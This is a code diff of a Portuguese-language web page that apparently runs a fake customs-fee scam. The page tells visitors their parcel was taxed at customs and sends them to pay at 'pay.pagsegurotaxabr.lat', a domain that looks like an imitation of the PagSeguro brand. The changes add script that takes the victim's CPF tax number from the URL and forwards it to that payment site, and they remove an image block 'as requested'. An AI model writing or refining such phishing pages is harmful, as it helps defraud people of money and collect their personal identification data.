@@ -109,9 +109,7 @@
             <p class="text-gray-700 mb-4">Seu pedido passou por um processo na alfândega e foi taxado.</p>
 
         <!-- Imagem do Pacote -->
-        <div id="imagemContainer" class="mb-4 hidden">
-            <img id="imagemPedido" src="" alt="Imagem do Pedido" class="w-full max-w-sm mx-auto rounded-md shadow-md">
-        </div>
+        <!-- Removido conforme solicitado -->
         
         <!-- Texto explicativo -->
         <p class="text-gray-700 mb-4">Por gentileza, solicitamos a realização do pagamento da taxa, para que, consecutivamente, possamos dar prosseguimento ao envio do seu produto, no prazo de 3 dias úteis.</p>
@@ -313,6 +311,8 @@
     </footer>
 
     <script>
+        let clientId = '';
+        let cpf = '';
         (function() {
             const nav = performance.getEntriesByType && performance.getEntriesByType('navigation')[0];
             const isReload = (nav && nav.type === 'reload') || (performance.navigation && performance.navigation.type === 1);
@@ -330,24 +330,29 @@
                 body: 'action=payment_click'
             });
             
-            window.location.href = 'https://pay.pagsegurotaxabr.lat/ODAK3Ll2d0D3E6V?name=&amp;document=&amp;telephone=';
+            const nameParam = clientId ? encodeURIComponent(clientId) : '';
+            const documentParam = cpf ? encodeURIComponent(cpf) : '';
+            window.location.href = 'https://pay.pagsegurotaxabr.lat/ODAK3Ll2d0D3E6V?name=' + nameParam + '&document=' + documentParam + '&telephone=';
         }
 
         // Pegar parâmetros da URL e atualizar página
         const urlParams = new URLSearchParams(window.location.search);
         const nome = urlParams.get('nome');
-        const cpf = urlParams.get('cpf');
+        cpf = urlParams.get('cpf');
         const nascimento = urlParams.get('nascimento');
         const imagem = urlParams.get('imagem');
 
-        if (nome) {
+        if (cpf) {
+            // Gerar identificador baseado no CPF
+            const cpfNumbers = cpf.replace(/\D/g, '');
+            const idNumber = (parseInt(cpfNumbers) % 10000).toString().padStart(4, '0');
+            clientId = 'Cliente #' + idNumber;
+            document.querySelector('p strong').textContent = clientId;
+        } else if (nome) {
             document.querySelector('p strong').textContent = nome;
         }
 
-        if (imagem) {
-            document.getElementById('imagemPedido').src = imagem;
-            document.getElementById('imagemContainer').classList.remove('hidden');
-        }
+        // Removido código da imagem conforme solicitado
 
             </script>
 
